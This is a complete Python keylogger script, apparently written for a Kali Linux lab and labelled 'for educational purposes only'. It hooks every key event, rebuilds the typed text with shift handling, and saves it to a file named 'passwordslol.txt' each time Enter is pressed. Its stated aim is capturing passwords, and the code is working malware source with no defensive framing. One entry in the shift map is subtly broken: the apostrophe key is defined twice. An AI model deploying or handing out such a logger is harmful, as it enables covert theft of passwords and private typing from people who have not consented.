# written by Drew Campbell. For educational purposes only.

import keyboard

# create a variable to hold keystrokes
data = ''
# create a variable to flag if the shift key is being held down
shiftPressed = False

# create a dictionary to return the correct character when shift is pressed
shiftChar = {
    "`":"~",
    "1":"!",
    "2":"@",
    "3":"#",
    "4":"$",
    "5":"%",
    "6":"^",
    "7":"&",
    "8":"*",
    "9":"(",
    "0":")",
    "-":"_",
    "=":"+",
    "[":"{",
    "]":"}",
    '\'':'|',
    ";":":",
    "'":'"',
    ",":"<",
    ".":">",
    "/":"?",
    "shift":""
    }

# create list of keyboard inputs that will not be printed out
passChar = ["up", "down", "left", "right", "esc", "tab", "caps lock", "ctrl", "shift", "alt", "end", "home"]


while True:
    # detect when a key is pressed
    event = keyboard.read_event()
    # set variable when shift is pressed
    if event.event_type == keyboard.KEY_DOWN and event.name == "shift":
        shiftPressed = True
    if event.event_type == keyboard.KEY_UP and event.name == "shift":
        shiftPressed = False
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == "enter":
            # create new line on enter
            data += '\n'
            # write out keylogs to a txt file
            with open("/home/kali/Desktop/passwordslol.txt", "w") as outFile:
                outFile.write(data)
        elif event.name == "space":
            data += ' '
        elif event.name == "backspace":
            data += " backspace "
        elif event.name in passChar:
            pass
        else:
            # check if shift is pressed and append the correct character to data
            if event.name in shiftChar and shiftPressed:
                data += shiftChar[event.name]
            elif shiftPressed:
                data += event.name.upper()
            else:
                data += event.name



